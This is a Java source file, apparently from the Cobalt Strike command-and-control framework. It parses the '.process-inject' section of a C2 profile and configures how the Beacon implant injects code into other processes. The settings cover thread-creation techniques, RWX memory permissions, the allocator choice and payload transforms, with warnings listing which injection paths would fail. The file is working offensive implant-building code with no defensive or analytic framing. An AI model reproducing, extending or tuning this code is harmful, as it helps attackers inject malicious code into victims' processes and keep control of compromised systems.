package beacon.setup;

import beacon.Settings;
import c2profile.Profile;
import common.CommonUtils;
import common.Packer;

import java.io.IOException;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;

public class ProcessInject {
    protected Profile c2profile;

    protected String allocator;

    protected boolean userwx;

    protected boolean startrwx;

    protected int min_alloc;

    protected byte[] prepended_x86;

    protected byte[] appended_x86;

    protected byte[] prepended_x64;

    protected byte[] appended_x64;

    protected List errors = new LinkedList();

    protected List warnings = new LinkedList();

    protected String defaultl = "CreateThread, SetThreadContext, CreateRemoteThread, RtlCreateUserThread";

    public ProcessInject(Profile profile) throws IOException {
        this.c2profile = profile;
        parse();
    }

    protected void setupProcessInjectTransform(Settings settings, int n,
                                               byte[] arrby1, byte[] arrby2) {
        Packer packer = new Packer();
        packer.big();
        packer.addInt(arrby1.length);
        packer.append(arrby1);
        packer.addInt(arrby2.length);
        packer.append(arrby2);
        settings.addData(n, packer.getBytes(), 256);
    }

    protected List<String> getExecuteList() {
        List<String> list = c2profile.getList(".process-inject.execute");
        if (list.size() == 0) {
            return CommonUtils.toList(defaultl);
        }
        return list;
    }

    public void checkExecuteList() {
        HashSet<String> hashSet = new HashSet();
        for (String str : getExecuteList()) {
            if ("CreateThread".equals(str) || str.startsWith("CreateThread ")) {
                hashSet.add("self-inject");
                continue;
            }
            if ("SetThreadContext".equals(str)) {
                hashSet.add("x64 -> x86 (suspended)");
                hashSet.add("x64 -> x64 (suspended)");
                hashSet.add("x86 -> x86 (suspended)");
                continue;
            }
            if ("CreateRemoteThread".equals(str)) {
                hashSet.add("x86 -> x86");
                hashSet.add("x64 -> x86");
                hashSet.add("x64 -> x64");
                hashSet.add("self-inject");
                hashSet.add("x64 -> x86 (suspended)");
                hashSet.add("x64 -> x64 (suspended)");
                hashSet.add("x86 -> x86 (suspended)");
                continue;
            }
            if ("RtlCreateUserThread".equals(str)) {
                hashSet.add("x64 -> x86");
                hashSet.add("x64 -> x64");
                hashSet.add("x86 -> x64");
                hashSet.add("x86 -> x86");
                hashSet.add("x64 -> x86 (cross session)");
                hashSet.add("x64 -> x64 (cross session)");
                hashSet.add("x86 -> x64 (cross session)");
                hashSet.add("x86 -> x86 (cross session)");
                hashSet.add("x64 -> x86 (suspended)");
                hashSet.add("x64 -> x64 (suspended)");
                hashSet.add("x86 -> x64 (suspended)");
                hashSet.add("x86 -> x86 (suspended)");
                hashSet.add("self-inject");
                continue;
            }
            if ("NtQueueApcThread".equals(str)) {
                hashSet.add("x86 -> x86");
                hashSet.add("x86 -> x86 (cross session)");
                hashSet.add("x64 -> x64");
                hashSet.add("x64 -> x64 (cross session)");
                continue;
            }
            if (str.startsWith("CreateRemoteThread ")) {
                hashSet.add("x86 -> x86");
                hashSet.add("x64 -> x64");
                hashSet.add("self-inject");
                hashSet.add("x64 -> x64 (suspended)");
                hashSet.add("x86 -> x86 (suspended)");
                if (!CommonUtils.isin(" ntdll", str.toLowerCase())
                        && !CommonUtils.isin(" kernel32", str.toLowerCase())) {
                    warnings.add(".process-injext.execute " + str
                            + " should reference an ntdll or kernel32 function.");
                }
                continue;
            }
            if ("NtQueueApcThread-s".equals(str)) {
                hashSet.add("x64 -> x64 (suspended)");
                hashSet.add("x86 -> x86 (suspended)");
            }
        }
        if (!hashSet.contains("self-inject")) {
            this.warnings.add(".process-inject.execute injection into current process will fail.");
        }
        if (!hashSet.contains("x86 -> x86")) {
            this.warnings.add(".process-inject.execute x86 -> x86 injection will fail.");
        } else if (!hashSet.contains("x86 -> x86 (cross session)")) {
            this.warnings.add(".process-inject.execute x86 -> x86 (cross session) injection will fail.");
        }
        if (!hashSet.contains("x86 -> x64")) {
            this.warnings.add(".process-inject.execute x86 -> x64 injection will fail.");
        } else if (!hashSet.contains("x86 -> x64 (cross session)")) {
            this.warnings.add(".process-inject.execute x86 -> x64 (cross session) injection will fail.");
        }
        if (!hashSet.contains("x64 -> x86")) {
            this.warnings.add(".process-inject.execute x64 -> x86 injection will fail.");
        } else if (!hashSet.contains("x64 -> x86 (cross session)")) {
            this.warnings.add(".process-inject.execute x64 -> x86 (cross session) injection will fail.");
        }
        if (!hashSet.contains("x64 -> x64")) {
            this.warnings.add(".process-inject.execute x64 -> x64 injection will fail.");
        } else if (!hashSet.contains("x64 -> x64 (cross session)")) {
            this.warnings.add(".process-inject.execute x64 -> x64 (cross session) injection will fail.");
        }
        if (!hashSet.contains("x86 -> x86 (suspended)"))
            this.warnings.add(".process-inject.execute x86 -> x86 (suspended) injection will fail. This affects most post-ex features.");
        if (!hashSet.contains("x64 -> x64 (suspended)"))
            this.warnings.add(".process-inject.execute x64 -> x64 (suspended) injection will fail. This affects most post-ex features.");
        if (!hashSet.contains("x64 -> x86 (suspended)"))
            this.warnings.add(".process-inject.execute x64 -> x86 (suspended) injection will fail. This affects some post-ex features.");
        if (!hashSet.contains("x86 -> x64 (suspended)"))
            this.warnings.add(".process-inject.execute x86 -> x64 (suspended) injection will fail. This affects some post-ex features.");
        byte[] arrby = getExecuteValue();
        if (arrby.length > 128)
            this.errors.add(".process-inject.execute block is " + arrby.length + " bytes. Reduce its size to <128b or Beacon will crash.");
    }

    protected void special(int n, String string, Packer packer) {
        String[] arrstring = string.split(" ");
        String str1 = arrstring[1];
        String str2 = arrstring[2];
        String str3 = arrstring[3];
        packer.addByte(n);
        packer.addShort(CommonUtils.toNumber(str3, 0));
        packer.addLengthAndStringASCIIZ(str1);
        packer.addLengthAndStringASCIIZ(str2);
    }

    protected void setupExecuteList(Settings settings) {
        settings.addData(51, getExecuteValue(), 128);
    }

    protected byte[] getExecuteValue() {
        Packer packer = new Packer();
        for (String str : getExecuteList()) {
            if ("CreateThread".equals(str)) {
                packer.addByte(1);
                continue;
            }
            if ("SetThreadContext".equals(str)) {
                packer.addByte(2);
                continue;
            }
            if ("CreateRemoteThread".equals(str)) {
                packer.addByte(3);
                continue;
            }
            if ("RtlCreateUserThread".equals(str)) {
                packer.addByte(4);
                continue;
            }
            if ("NtQueueApcThread".equals(str)) {
                packer.addByte(5);
                continue;
            }
            if (str.startsWith("CreateThread ")) {
                special(6, str, packer);
                continue;
            }
            if (str.startsWith("CreateRemoteThread ")) {
                special(7, str, packer);
                continue;
            }
            if ("NtQueueApcThread-s".equals(str)) {
                packer.addByte(8);
                continue;
            }
            CommonUtils.print_error(".process-inject unknown function \"" + str + "\"");
        }
        packer.addByte(0);
        return packer.getBytes();
    }

    public List getErrors() {
        return this.errors;
    }

    public List getWarnings() {
        return this.warnings;
    }

    public ProcessInject check() {
        boolean bool1 = this.c2profile.option(".process-inject.CreateRemoteThread");
        boolean bool2 = this.c2profile.option(".process-inject.SetThreadContext");
        boolean bool3 = this.c2profile.option(".process-inject.RtlCreateUserThread");
        if (!bool1)
            this.errors.add(".process-inject disable \"CreateRemoteThread\" is deprecated and has no effect. Use process-inject -> execute instead.");
        if (!bool3)
            this.errors.add(".process-inject disable \"RtlCreateUserThread\" is deprecated and has no effect. Use process-inject -> execute instead.");
        if (!bool2)
            this.errors.add(".process-inject disable \"SetTreadContext\" is deprecated and has no effect. Use process-inject -> execute instead.");
        checkExecuteList();
        return this;
    }

    public void parse() throws IOException {
        this.userwx = this.c2profile.option(".process-inject.userwx");
        this.startrwx = this.c2profile.option(".process-inject.startrwx");
        this.min_alloc = this.c2profile.getInt(".process-inject.min_alloc");
        this.prepended_x86 = this.c2profile.getPrependedData(".process-inject.transform-x86");
        this.appended_x86 = this.c2profile.getAppendedData(".process-inject.transform-x86");
        this.prepended_x64 = this.c2profile.getPrependedData(".process-inject.transform-x64");
        this.appended_x64 = this.c2profile.getAppendedData(".process-inject.transform-x64");
        this.allocator = this.c2profile.getString(".process-inject.allocator");
    }

    public ProcessInject apply(Settings settings) throws IOException {
        settings.addShort(43, this.startrwx ? 64 : 4);
        settings.addShort(44, this.userwx ? 64 : 32);
        settings.addInt(45, this.min_alloc);
        setupProcessInjectTransform(settings, 46, this.prepended_x86, this.appended_x86);
        setupProcessInjectTransform(settings, 47, this.prepended_x64, this.appended_x64);
        settings.addData(53, this.c2profile.getByteArray(".self"), 16);
        setupExecuteList(settings);
        if ("VirtualAllocEx".equals(this.allocator)) {
            settings.addShort(52, 0);
        } else if ("NtMapViewOfSection".equals(this.allocator)) {
            settings.addShort(52, 1);
        } else {
            CommonUtils.print_error("Unknown allocator: '" + this.allocator + "'");
        }
        return this;
    }
}
